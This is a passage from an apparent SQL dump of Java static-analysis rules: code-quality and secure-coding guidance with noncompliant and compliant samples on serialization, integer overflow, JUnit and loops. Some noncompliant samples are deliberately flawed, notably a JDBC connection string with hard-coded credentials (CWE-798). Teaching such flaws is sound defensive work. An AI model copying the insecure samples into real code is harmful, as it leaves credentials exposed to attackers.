public class Fruit implements Serializable {
  private static final long serialVersionUID = 1;

  private Object readResolve() throws ObjectStreamException  // Noncompliant
  {...}

  //...
}

public class Raspberry extends Fruit implements Serializable {  // No access to parent''s readResolve() method
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit implements Serializable {
  private static final long serialVersionUID = 1;

  protected Object readResolve() throws ObjectStreamException
  {...}

  //...
}

public class Raspberry extends Fruit implements Serializable {
  //...
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812763, 1510817812763, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (759, 'Classes should not have too many "static" imports', 'S3030', NULL, 'squid', '<p>Importing a class statically allows you to use its <code>public static</code> members without qualifying them with the class name. That can be
handy, but if you import too many classes statically, your code can become confusing and difficult to maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value: 4</p>
<pre>
import static java.lang.Math.*;
import static java.util.Collections.*;
import static com.myco.corporate.Constants.*;
import static com.myco.division.Constants.*;
import static com.myco.department.Constants.*;  // Noncompliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812764, 1510817812764, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (760, 'Custom serialization method signatures should meet requirements', 'S2061', NULL, 'squid', '<p>Writers of <code>Serializable</code> classes can choose to let Java''s automatic mechanisms handle serialization and deserialization, or they can
choose to handle it themselves by implementing specific methods. However, if the signatures of those methods are not exactly what is expected, they
will be ignored and the default serialization mechanisms will kick back in. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Watermelon implements Serializable {
  // ...
  void writeObject(java.io.ObjectOutputStream out)// Noncompliant; not private
        throws IOException
  {...}

  private void readObject(java.io.ObjectInputStream in)
  {...}

  public void readObjectNoData()  // Noncompliant; not private
  {...}

  static Object readResolve() throws ObjectStreamException  // Noncompliant; this method may have any access modifier, may not be static

  Watermelon writeReplace() throws ObjectStreamException // Noncompliant; this method may have any access modifier, but must return Object
  {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Watermelon implements Serializable {
  // ...
  private void writeObject(java.io.ObjectOutputStream out)
        throws IOException
  {...}

  private void readObject(java.io.ObjectInputStream in)
        throws IOException, ClassNotFoundException
  {...}

  private void readObjectNoData()
        throws ObjectStreamException
  {...}

  protected Object readResolve() throws ObjectStreamException
  {...}

  private Object writeReplace() throws ObjectStreamException
  {...}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/4gAMAg">CERT, SER01-J.</a> - Do not deviate from the proper signatures of serialization
  methods </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817812765, 1510817812766, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (762, 'Math operands should be cast before assignment', 'S2184', NULL, 'squid', '<p>When arithmetic is performed on integers, the result will always be an integer. You can assign that result to a <code>long</code>,
<code>double</code>, or <code>float</code> with automatic type conversion, but having started as an <code>int</code> or <code>long</code>, the result
will likely not be what you expect. </p>
<p>For instance, if the result of <code>int</code> division is assigned to a floating-point variable, precision will have been lost before the
assignment. Likewise, if the result of multiplication is assigned to a <code>long</code>, it may have already overflowed before the assignment.</p>
<p>In either case, the result will not be what was expected. Instead, at least one operand should be cast or promoted to the final type before the
operation takes place.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float twoThirds = 2/3; // Noncompliant; int division. Yields 0.0
long millisInYear = 1_000*3_600*24*365; // Noncompliant; int multiplication. Yields 1471228928
long bigNum = Integer.MAX_VALUE + 2; // Noncompliant. Yields -2147483647
long bigNegNum =  Integer.MIN_VALUE-1; //Noncompliant, gives a positive result instead of a negative one.
Date myDate = new Date(seconds * 1_000); //Noncompliant, won''t produce the expected result if seconds &gt; 2_147_483
...
public long compute(int factor){
  return factor * 10_000;  //Noncompliant, won''t produce the expected result if factor &gt; 214_748
}

public float compute2(long factor){
  return factor / 123;  //Noncompliant, will be rounded to closest long integer
}
</pre>
<h2>Compliant Solution</h2>
<pre>
float twoThirds = 2f/3; // 2 promoted to float. Yields 0.6666667
long millisInYear = 1_000L*3_600*24*365; // 1000 promoted to long. Yields 31_536_000_000
long bigNum = Integer.MAX_VALUE + 2L; // 2 promoted to long. Yields 2_147_483_649
long bigNegNum =  Integer.MIN_VALUE-1L; // Yields -2_147_483_649
Date myDate = new Date(seconds * 1_000L);
...
public long compute(int factor){
  return factor * 10_000L;
}

public float compute2(long factor){
  return factor / 123f;
}
</pre>
<p>or</p>
<pre>
float twoThirds = (float)2/3; // 2 cast to float
long millisInYear = (long)1_000*3_600*24*365; // 1_000 cast to long
long bigNum = (long)Integer.MAX_VALUE + 2;
long bigNegNum =  (long)Integer.MIN_VALUE-1;
Date myDate = new Date((long)seconds * 1_000);
...
public long compute(long factor){
  return factor * 10_000;
}

public float compute2(float factor){
  return factor / 123;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 5-0-8 - An explicit integral or floating-point conversion shall not increase the size of the underlying type of a cvalue
  expression. </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/190">MITRE, CWE-190</a> - Integer Overflow or Wraparound </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/woIyAQ">CERT, NUM50-J.</a> - Convert integers to floating point for floating-point
  operations </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/AxE">CERT, INT18-C.</a> - Evaluate integer expressions in a larger size before
  comparing or assigning to that size </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1IAyAQ">CERT, INT18-CPP.</a> - Evaluate integer expressions in a larger size before
  comparing or assigning to that size </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Risky Resource Management </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,misra,overflow,sans-top25-risky', false, 'HTML', 1510817812768, 1510817812768, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (763, 'Comparators should be "Serializable"', 'S2063', NULL, 'squid', '<p>A non-serializable <code>Comparator</code> can prevent an otherwise-<code>Serializable</code> ordered collection from being serializable. Since the
overhead to make a <code>Comparator</code> serializable is usually low, doing so can be considered good defensive programming.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitComparator implements Comparator&lt;Fruit&gt; {  // Noncompliant
  int compare(Fruit f1, Fruit f2) {...}
  boolean equals(Object obj) {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitComparator implements Comparator&lt;Fruit&gt;, Serializable {
  private static final long serialVersionUID = 1;

  int compare(Fruit f1, Fruit f2) {...}
  boolean equals(Object obj) {...}
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall,serialization', false, 'HTML', 1510817812769, 1510817812770, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (764, '"Serializable" inner classes of non-serializable classes should be "static"', 'S2066', NULL, 'squid', '<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is not
serializable, then serialization will fail, resulting in a runtime error. </p>
<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible.
However, you should be aware that there are semantic differences between an inner class and a nested one: </p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Pomegranate {
  // ...

  public class Seed implements Serializable {  // Noncompliant; serialization will fail
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Pomegranate {
  // ...

  public static class Seed implements Serializable {
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/O4CpAQ">CERT SER05-J.</a> - Do not serialize instances of inner classes </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,serialization', false, 'HTML', 1510817812770, 1510817812771, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (765, 'Raw byte values should not be used in bitwise operations in combination with shifts', 'S3034', NULL, 'squid', '<p>When reading bytes in order to build other primitive values such as <code>int</code>s or <code>long</code>s, the <code>byte</code> values are
automatically promoted, but that promotion can have unexpected results.</p>
<p>For instance, the binary representation of the integer 640 is <code>0b0000_0010_1000_0000</code>, which can also be written with the array of
(unsigned) bytes <code>[2, 128]</code>. However, since Java uses two''s complement, the representation of the integer in signed bytes will be <code>[2,
-128]</code> (because the <code>byte</code> <code>0b1000_0000</code> is promoted to the <code>int</code>
<code>0b1111_1111_1111_1111_1111_1111_1000_0000</code>). Consequently, trying to reconstruct the initial integer by shifting and adding the values of
the bytes without taking care of the sign will not produce the expected result. </p>
<p>To prevent such accidental value conversion, use bitwise and (<code>&amp;</code>) to combine the <code>byte</code> value with <code>0xff</code>
(255) and turn all the higher bits back off.</p>
<p>This rule raises an issue any time a <code>byte</code> value is used as an operand without <code>&amp; 0xff</code>, when combined with shifts.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  int intFromBuffer() {
    int result = 0;
    for (int i = 0; i &lt; 4; i++) {
      result = (result &lt;&lt; 8) | readByte(); // Noncompliant
    }
    return result;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  int intFromBuffer() {
    int result = 0;
    for (int i = 0; i &lt; 4; i++) {
      result = (result &lt;&lt; 8) | (readByte() &amp; 0xff);
    }
    return result;
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SAHEAw">CERT, NUM52-J.</a> - Be aware of numeric promotion behavior </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817812771, 1510817812772, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (766, 'TestCases should contain tests', 'S2187', NULL, 'squid', '<p>There''s no point in having a JUnit <code>TestCase</code> without any test methods. Similarly, you shouldn''t have a file in the tests directory with
"Test" in the name, but no tests in the file. Doing either of these things may lead someone to think that uncovered classes have been tested.</p>
<p>This rule raises an issue when files in the test directory have "Test" in the name or implement <code>TestCase</code> but don''t contain any
tests.</p>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing,tests,unused', false, 'HTML', 1510817812773, 1510817812774, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (767, 'Fields in non-serializable classes should not be "transient"', 'S2065', NULL, 'squid', '<p><code>transient</code> is used to mark fields in a <code>Serializable</code> class which will not be written out to file (or stream). In a class
that does not implement <code>Serializable</code>, this modifier is simply wasted keystrokes, and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Vegetable {  // does not implement Serializable
  private transient Season ripe;  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Vegetable {
  private Season ripe;
  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'serialization,unused', false, 'HTML', 1510817812775, 1510817812776, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (768, 'JUnit assertions should not be used in "run" methods', 'S2186', NULL, 'squid', '<p>JUnit assertions should not be made from the <code>run</code> method of a <code>Runnable</code>, because failed assertions result in
<code>AssertionError</code>s being thrown. If the error is thrown from a thread other than the one that ran the test, the thread will exit but the
test won''t fail.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void run() {
  // ...
  Assert.assertEquals(expected, actual);  // Noncompliant
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'tests', false, 'HTML', 1510817812776, 1510817812777, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (769, 'Credentials should not be hard-coded', 'S2068', NULL, 'squid', '<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they''re almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Connection conn = null;
try {
  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
        "user=steve&amp;password=blue"); // Noncompliant
  String uname = "steve";
  String password = "blue";
  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
        "user=" + uname + "&amp;password=" + password); // Noncompliant

  java.net.PasswordAuthentication pa = new java.net.PasswordAuthentication("userName", "1234".toCharArray());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Connection conn = null;
try {
  String uname = getEncryptedUser();
  String password = getEncryptedPass();
  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
        "user=" + uname + "&amp;password=" + password);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> -
  Broken Authentication and Session Management </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert,cwe,owasp-a2,sans-top25-porous', false, 'HTML', 1510817812778, 1510817812778, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (770, 'Loops should not be infinite', 'S2189', NULL, 'squid', '<p>An infinite loop is one that will never end while the program is running, i.e., you have to kill the program to get out of the loop. Whether it is
by meeting the loop''s end condition or via a <code>break</code>, every loop should have an end condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;;) {  // Noncompliant; end condition omitted
  // ...
}

int j;
while (true) { // Noncompliant; end condition omitted
  j++;
}

int k;
boolean b = true;
while (b) { // Noncompliant; b never written to in loop
  k++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int j;
while (true) { // reachable end condition added
  j++;
  if (j  == Integer.MIN_VALUE) {  // true at Integer.MAX_VALUE +1
    break;
  }
}

int k;
boolean b = true;
while (b) {
  k++;
  b = k &lt; Integer.MAX_VALUE;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PYHfAw">CERT, MSC01-J.</a> - Do not use an empty infinite loop </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert', false, 'HTML', 1510817812779, 1510817812779, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (771, '"private" methods called only by inner classes should be moved to those classes', 'S3398', NULL, 'squid', '<p>When a <code>private</code> method is only invoked by an inner class, there''s no reason not to move it into that class. It will still have the same
access to the outer class'' members, but the outer class will be clearer and less cluttered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Outie {
  private int i=0;

  private void increment() {  // Noncompliant
    i++;
  }

  public class Innie {
    public void doTheThing() {
      Outie.this.increment();
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Outie {
  private int i=0;

  public class Innie {
    public void doTheThing() {
      Outie.this.increment();
    }

    private void increment() {
      Outie.this.i++;
    }
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817812780, 1510817812780, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (772, 'JUnit test cases should call super methods', 'S2188', NULL, 'squid', '<p>Overriding a parent class method prevents that method from being called unless an explicit <code>super</code> call is made in the overriding
method. In some cases not calling the <code>super</code> method is acceptable, but not with <code>setUp</code> and <code>tearDown</code> in a JUnit 3
<code>TestCase</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClassTest extends MyAbstractTestCase {

  private MyClass myClass;
    @Override
    protected void setUp() throws Exception {  // Noncompliant
      myClass = new MyClass();
    }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClassTest extends MyAbstractTestCase {

  private MyClass myClass;
    @Override
    protected void setUp() throws Exception {
      super.setUp();
      myClass = new MyClass();
    }
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'tests', false, 'HTML', 1510817812781, 1510817812781, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (776, 'Deprecated elements should have both the annotation and the Javadoc tag', 'MissingDeprecatedCheck', 'S1123', 'squid', '<p>Deprecation should be marked with both the <code>@Deprecated</code> annotation and @deprecated Javadoc tag. The annotation enables tools such as
IDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was deprecated, why, and how references should be
refactored. </p>
<p>Further, Java 9 adds two additional arguments to the annotation:</p>
<ul>
  <li> <code>since</code> allows you to describe when the deprecation took place </li>
  <li> <code>forRemoval</code>, indicates whether the deprecated element will be removed at some future date </li>
</ul>
<p>If your compile level is Java 9 or higher, you should be using one or both of these arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  @Deprecated
  public void foo1() {
  }

  /**
    * @deprecated
    */
  public void foo2() {    // Noncompliant
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  /**
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated
  public void foo1() {
  }

  /**
    * Java &gt;= 9
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated(since="5.1")
  public void foo2() {
  }

  /**
    * Java &gt;= 9
    * @deprecated (when, why, refactoring advice...)
    */
  @Deprecated(since="4.2", forRemoval=true)
  public void foo3() {
  }

}
</pre>
<h2>Exceptions</h2>
<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to
it.</p>
<pre>
/**
 * @deprecated (when, why, etc...)
 */
@Deprecated
class Qix  {

  public void foo() {} // Compliant; class is deprecated

}

/**
 * @deprecated (when, why, etc...)
 */
@Deprecated
interface Plop {

  void bar();

}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'bad-practice,obsolete', false, 'HTML', 1510817812786, 1510817812787, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (777, 'Lamdbas containing only one statement should not nest this statement in a block', 'S1602', NULL, 'squid', '<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x -&gt; {System.out.println(x+1);}
(a, b) -&gt; { return a+b; }
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; System.out.println(x+1)
(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'java8', false, 'HTML', 1510817812788, 1510817812788, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (790, 'Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply', 'S134', NULL, 'squid', '<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what''s known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
if (condition1) {                  // Compliant - depth = 1
  /* ... */
  if (condition2) {                // Compliant - depth = 2
    /* ... */
    for(int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit
      /* ... */
      if (condition4) {            // Noncompliant - depth = 4
        if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
          /* ... */
        }
        return;
      }
    }
  }
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812804, 1510817812804, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (779, 'Methods and field names should not be the same or differ only by capitalization', 'S1845', NULL, 'squid', '<p>Looking at the set of methods in a class, including superclass methods, and finding two methods or fields that differ only by capitalization is
confusing to users of the class. It is similarly confusing to have a method and a field which differ only in capitalization or a method and a field
with exactly the same name and visibility.</p>
<p>In the case of methods, it may have been a mistake on the part of the original developer, who intended to override a superclass method, but instead
added a new method with nearly the same name.</p>
<p>Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the
case where both a method and a member have the same name (with or without capitalization differences). However, renaming a public method could be
disruptive to callers. Therefore renaming the member is the recommended action.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Car{

  public DriveTrain drive;

  public void tearDown(){...}

  public void drive() {...}  // Noncompliant; duplicates field name
}

public class MyCar extends Car{
  public void teardown(){...}  // Noncompliant; not an override. It it really what''s intended?

  public void drivefast(){...}

  public void driveFast(){...} //Huh?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Car{

  private DriveTrain drive;

  public void tearDown(){...}

  public void drive() {...}  // field visibility reduced
}

public class MyCar extends Car{
  @Override
  public void tearDown(){...}

  public void drivefast(){...}

  public void driveReallyFast(){...}

}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'confusing', false, 'HTML', 1510817812790, 1510817812790, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (780, 'Anonymous inner classes containing only one method should become lambdas', 'S1604', NULL, 'squid', '<p>Before Java 8, the only way to partially support closures in Java was by using anonymous inner classes. But the syntax of anonymous classes may
seem unwieldy and unclear.</p>
<p>With Java 8, most uses of anonymous inner classes should be replaced by lambdas to highly increase the readability of the source code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myCollection.stream().map(new Mapper&lt;String,String&gt;() {
  public String map(String input) {
    return new StringBuilder(input).reverse().toString();
  }
});

Predicate&lt;String&gt; isEmpty = new Predicate&lt;String&gt; {
    boolean test(String myString) {
        return myString.isEmpty();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myCollection.stream().map(input -&gt; new StringBuilder(input).reverse().toString());

Predicate&lt;String&gt; isEmpty = myString -&gt; myString.isEmpty();
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'java8', false, 'HTML', 1510817812791, 1510817812791, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (781, '"Iterator.hasNext()" should not call "Iterator.next()"', 'S1849', NULL, 'squid', '<p>Calling <code>Iterator.hasNext()</code> is not supposed to have any side effects, and therefore should not change the state of the iterator.
